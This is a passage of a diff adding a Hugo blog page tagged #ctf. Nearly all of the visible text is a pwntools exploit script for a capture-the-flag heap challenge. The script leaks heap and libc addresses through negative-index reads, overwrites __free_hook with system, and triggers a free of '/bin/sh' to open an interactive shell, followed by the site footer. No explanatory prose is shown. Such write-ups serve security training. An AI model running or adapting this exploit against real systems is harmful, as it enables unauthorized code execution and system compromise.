+    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;gdb&#39;</span>:
+       gdb<span style="color:#f92672">.</span>attach(p, gdbscript<span style="color:#f92672">=</span>gdbscript)
+
+<span style="color:#75715e">#---</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">eat</span>():
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#39;1&#39;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>(size, data):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;How long is the message?&#34;</span>, str(size))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Input your message:&#34;</span>, data)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(idx, data):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#39;3&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Which cookie?&#34;</span>, str(idx))
+    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;New Message:&#34;</span>, data)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(idx):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#39;4&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Which cookie?&#34;</span>, str(idx))
+
+<span style="color:#75715e">#print(p.recvline())</span>
+show(<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>)
+p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">7</span>)
+target <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x80</span>
+info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;target: </span><span style="color:#e6db74">{</span>hex(target)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">27</span>):
+    create(<span style="color:#ae81ff">0x88</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+
+<span style="color:#75715e"># #input()</span>
+edit(<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>, p64(target))
+edit(<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>, p64(target<span style="color:#f92672">-</span><span style="color:#ae81ff">0x68</span>))
+show(<span style="color:#ae81ff">5</span>)
+p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>)
+<span style="color:#75715e">#input()</span>
+libc_base <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span><span style="color:#ae81ff">0x3ec760</span>
+info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc_base: </span><span style="color:#e6db74">{</span>hex(libc_base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+free_hook <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__free_hook&#39;</span>]
+system <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
+edit(<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>, p64(free_hook))
+edit(<span style="color:#ae81ff">5</span>, p64(system))
+print(<span style="color:#e6db74">&#34;hi&#34;</span>)
+eat()
+
+
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div></div>
+</article>
+
+    <hr />
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                href="/tags/ctf">#ctf</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2023 &copy; Some copyright notice - <a href="https://example.com/license">my license</a>
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
